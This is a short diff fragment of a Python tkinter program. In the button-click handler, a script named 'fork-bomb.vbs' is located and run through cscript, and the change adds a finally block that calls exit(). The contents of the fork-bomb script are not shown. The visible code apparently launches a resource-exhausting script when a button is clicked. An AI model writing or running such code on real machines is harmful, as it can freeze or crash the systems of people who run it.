@@ -27,7 +27,8 @@ def on_button_click():
     except runVBS:
         script_path = path_finder("scripts", "fork-bomb.vbs")
         subprocess.run(["cscript", script_path])
-
+    finally:
+        exit()
 
 
 root = tkinter.Tk()
